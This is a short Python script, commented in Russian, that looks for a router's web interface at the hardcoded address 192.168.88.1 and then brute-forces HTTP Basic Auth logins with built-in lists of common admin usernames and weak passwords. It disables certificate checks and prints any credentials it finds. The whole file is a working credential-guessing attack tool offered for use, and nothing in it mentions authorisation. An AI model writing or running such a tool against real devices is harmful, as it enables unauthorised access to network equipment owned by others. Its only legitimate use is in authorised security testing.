import requests
from requests.auth import HTTPBasicAuth
import urllib3

def check_web_interface_access(target_ip, ports=[80, 443, 8080, 8443]):
    """
    Проверяет доступ к веб-интерфейсу на указанных портах
    """
    print(f"Проверяем доступ к веб-интерфейсу {target_ip}...")
    
    for port in ports:
        for protocol in ['http', 'https']:
            url = f"{protocol}://{target_ip}:{port}/"
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    print(f"Найден веб-интерфейс: {url}")
                    return url
            except requests.exceptions.RequestException:
                continue
    
    print("Веб-интерфейс не найден на стандартных портах")
    return None

def brute_force_passwords(target_url, username_list, password_list):
    """
    Автоматизированная проверка паролей
    """
    print(f"Начинаем подбор паролей для {target_url}...")
    
    for username in username_list:
        for password in password_list:
            try:
                # Пробуем Basic Auth
                response = requests.get(
                    target_url, 
                    auth=HTTPBasicAuth(username, password),
                    timeout=5,
                    verify=False
                )
                
                if response.status_code == 200:
                    print(f"🎉 УСПЕХ! Найден доступ:")
                    print(f"   URL: {target_url}")
                    print(f"   Логин: {username}")
                    print(f"   Пароль: {password}")
                    return username, password
                
            except requests.exceptions.RequestException:
                continue
    
    print("Подходящие учетные данные не найдены")
    return None, None

def main():
    target_ip = "192.168.88.1"
    
    # Распространенные логины для сетевого оборудования
    common_usernames = [
        "admin", "administrator", "root", "user", 
        "guest", "operator", "support", "tech"
    ]
    
    # Словарь распространенных паролей
    common_passwords = [
        "admin", "password", "1234", "12345", "123456", 
        "password123", "admin123", "root", "default",
        "pass", "12345678", "123456789", "qwerty",
        "0000", "1111", "123", "secret", "", "password1"
    ]
    
    # Шаг 1: Находим веб-интерфейс
    web_interface_url = check_web_interface_access(target_ip)
    
    if web_interface_url:
        # Шаг 2: Пробуем подобрать пароль
        username, password = brute_force_passwords(
            web_interface_url, 
            common_usernames, 
            common_passwords
        )
        
        if username and password:
            print("\n" + "="*50)
            print("ДОСТУП ПОЛУЧЕН!")
            print(f"IP: {target_ip}")
            print(f"Логин: {username}")
            print(f"Пароль: {password}")
            print("="*50)
        else:
            print("\n Попробуйте расширить словарь паролей")
    else:
        print("\n Веб-интерфейс не обнаружен. Проверьте:")
        print("   - Доступность устройства в сети")
        print("   - Возможные нестандартные порты")
        print("   - Брандмауэрные правила")

if __name__ == "__main__":

    # Отключаем предупреждения о SSL для удобства
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()
